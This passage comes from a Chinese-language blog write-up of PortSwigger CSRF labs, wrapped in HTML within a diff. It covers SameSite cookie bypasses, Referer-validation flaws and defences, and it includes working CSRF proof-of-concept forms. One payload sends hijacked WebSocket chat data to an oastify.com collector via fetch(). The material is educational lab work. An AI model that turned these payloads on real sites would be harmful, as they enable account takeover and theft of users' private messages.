class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>ws<span class="symbol">&amp;#46;</span>onmessage<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#61;</span><span class="symbol">&amp;#32;</span>function<span class="symbol">&amp;#40;</span>event<span class="symbol">&amp;#41;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#123;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>fetch<span class="symbol">&amp;#40;</span><span class="symbol">&amp;apos;</span>https<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>ioaji2m8x451wesyk1ek4t1s0j6auaiz<span class="symbol">&amp;#46;</span>oastify<span class="symbol">&amp;#46;</span>com<span class="symbol">&amp;apos;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#123;</span>method<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;apos;</span>POST<span class="symbol">&amp;apos;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;#32;</span>mode<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;apos;</span>no<span class="symbol">&amp;#45;</span>cors<span class="symbol">&amp;apos;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;#32;</span>body<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#32;</span>event<span class="symbol">&amp;#46;</span>data<span class="symbol">&amp;#125;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#125;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;#47;</span>script<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;w&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>受害者在点击链接后向cms域名发起登录请求，触发反射型XSS；之后在cms域名提交CSRF表单获取聊天记录并利用外带技术发送的DNSLOG服务器。这个LAB攻击的巧妙之处在于利用兄弟域名上的漏洞绕过了Cookie的<code>SameSite=Strict</code>的限制，利用<code>CORS</code>策略绕过了跨域发送HTTP请求的限制。</p>
+<h3 id="默认Lax策略在120s的生效期"><a href="#默认Lax策略在120s的生效期" class="headerlink" title="默认Lax策略在120s的生效期"></a>默认Lax策略在120s的生效期</h3><ol start="9">
+<li>Bypassing SameSite Lax restrictions with newly issued cookies</li>
+</ol>
+<p>这个LAB涉及到一个知识点：没有显式的设置SameSite属性，此时浏览器默认按照Lax策略执行，但是为了不影响单点登录，在最开始的120秒内不会生效（如果显式的设置<code>SameSite=Lax</code>则没有这个问题），我在本地测试了下2分钟内，还真可以CSRF。也就是说需要在用户获取Cookie后的120秒内攻击成功或者在攻击前强制刷新用户Cookie</p>
+<p><img src="/2025/02/27/font-security-csrf/image-20250226125305170.png" alt="image-20250226125305170"></p>
+<p>分析OAUTH的登录过程，发现当访问<code>/social-login</code>时，如果已经走过一遍OAUTH的认证流程了，已经存在OAUTH服务器Cookie的情况下，会自动进行第三方登录。所以此时的思路如下：</p>
+<ul>
+<li><p>先让浏览器访问<code>/social-login</code>获取一个新的服务器Cookie</p>
+</li>
+<li><p>在120秒内提交CSRF表单</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@web-security-academy.net&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.open(&#x27;https://YOUR-LAB-ID.web-security-academy.net/social-login&#x27;);</span><br><span class="line">    setTimeout(changeEmail, 5000);</span><br><span class="line"></span><br><span class="line">    function changeEmail()&#123;</span><br><span class="line">        document.forms[0].submit();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是由于浏览器安全策略，在默认情况下会拦截无交互的弹窗行为</p>
+<p><img src="/2025/02/27/font-security-csrf/image-20250226140403617.png" alt="image-20250226140403617"></p>
+<p>所以只能继续在界面上诱导用户点击了，POC如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://0ab900040476404284911ee2001a008f.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@portswigger.net&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Click anywhere on the page<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://0ab900040476404284911ee2001a008f.web-security-academy.net/social-login&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(changeEmail, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">changeEmail</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Referer校验的设计缺陷"><a href="#Referer校验的设计缺陷" class="headerlink" title="Referer校验的设计缺陷"></a>Referer校验的设计缺陷</h3><ol start="10">
+<li>CSRF where Referer validation depends on header being present</li>
+</ol>
+<p>存在<code>Referer</code>校验，但如果去掉<code>Referer</code>则不进行校验<img src="/2025/02/27/font-security-csrf/image-20250226151252761.png" alt="image-20250226151252761"></p>
+<p>可以利用<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code>来告诉浏览器不携带<code>referrer</code>头，完整POC如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a1a009d0318e36a80a33f52006a00a6.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;yyzzxx<span class="symbol">&amp;#64;</span>normal<span class="symbol">&amp;#45;</span>user<span class="symbol">&amp;#46;</span>net&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="11">
+<li>CSRF with broken Referer validation</li>
+</ol>
+<p>存在<code>Referer</code>校验，但只要<code>Referer</code>包含目标域名即可。那么如何修改<code>Referer</code>方法呢，LAB的<code>Solution</code>介绍了<code>history.pushState</code>方法，我查了下文档，这个方法是用于向浏览器的历史会话栈增加条目，他会修改<code>Referer</code>的值这个方法接收3个参数：</p>
+<ul>
+<li>state：状态对象，这里直接用空字符串</li>
+<li>unused：由于历史原因，该参数存在且不能忽略；传递一个空字符串是安全的，以防将来对该方法进行更改</li>
+<li>url：新的历史条目URL。可以是绝对路径或者相对路径，但是必须和当前URL是同源的。</li>
+</ul>
+<p>同时由于浏览器的安全策略，在携带<code>Referer</code>头时会自动去掉URL参数，所以需要在利用服务器上配置策略：<code>Referrer-Policy: unsafe-url</code>，告诉浏览器携带Referer时不要去掉URL参数。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0aa200df03c79b4fc2bd3c4e002300af.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xadxxa<span class="symbol">&amp;#64;</span>normal<span class="symbol">&amp;#45;</span>user<span class="symbol">&amp;#46;</span>net&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/?0aa200df03c79b4fc2bd3c4e002300af.web-security-academy.net&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>受害者在点击CSRF链接后进行表单提交，<code>Referer</code>头原本是攻击者的服务器，但由于<code>history.pushState</code>方法修改了历史条目，<code>Referer</code>在后缀添加了一个目标服务器的域名作为GET参数，从而绕过了限制。</p>
+<h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><p>PortSwigger的LAB质量确实高，全刷完学到很多以前不知道的知识点</p>
+<ol>
+<li>Cookie在没有显式得设置<code>SameSite</code>的条件下，浏览器默认采用<code>Lax</code>策略，但会在120秒后才生效，如果显式的设置则没有这个问题</li>
+<li>可以利用<code>history.pushState</code>语句在不刷新页面的情况下修改当前URL地址，从而达到修改<code>Referrer</code>的目的</li>
+<li>可以用<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code>，告诉浏览器不携带<code>Referrer</code>头部</li>
+<li>可以在页面来源的服务端配置<code>Referrer-Policy: unsafe-url</code>，告诉浏览器携带<code>Referrer</code>头部时不去掉URL参数</li>
+</ol>
+<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><ul>
+<li><strong>CSRF tokens</strong>：对于重要表单，引入CSRF Token，该Token需要与当前用户的会话绑定，在提交表单的同时，校验当前Token的合法性。</li>
+<li><strong>SameSite cookies</strong>：设置Cookie的<code>SameSite</code>属性为<code>Strict</code>或<code>Lax</code>。虽然从LAB上看还是有机会绕过，但本质都是利用其他漏洞组合进行绕过。</li>
+<li><strong>Referer-based validation</strong>：Referer容易被绕过，校验需要严格检查，需要考虑<code>Referer</code>缺失的情况，在获取URL后，利用语言的URL API进行解析判断是否为合法的host</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/History/pushState">https://developer.mozilla.org/zh-CN/docs/Web/API/History/pushState</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/runt0">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LAB%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">LAB记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token%E7%9A%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-number">1.1.</span> <span class="toc-text">CSRF Token的设计缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CRLF%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84CSRF-Key"><span class="toc-number">1.2.</span> <span class="toc-text">利用CRLF注入重置受害者的CSRF Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-method%E5%8F%82%E6%95%B0%E9%87%8D%E5%86%99http%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">利用_method参数重写http方法绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">利用客户端重定向绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%B6%E4%BB%96%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">利用其他子域名的漏洞绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4Lax%E7%AD%96%E7%95%A5%E5%9C%A8120s%E7%9A%84%E7%94%9F%E6%95%88%E6%9C%9F"><span class="toc-number">1.6.</span> <span class="toc-text">默认Lax策略在120s的生效期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer%E6%A0%A1%E9%AA%8C%E7%9A%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-number">1.7.</span> <span class="toc-text">Referer校验的设计缺陷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">知识总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">防御方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/27/font-security-csrf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/27/font-security-csrf/&text=前端安全之CSRF总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/27/font-security-csrf/&is_video=false&description=前端安全之CSRF总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=前端安全之CSRF总结&body=Check out this article: http://example.com/2025/02/27/font-security-csrf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/27/font-security-csrf/&name=前端安全之CSRF总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/27/font-security-csrf/&t=前端安全之CSRF总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    runt0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/runt0">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
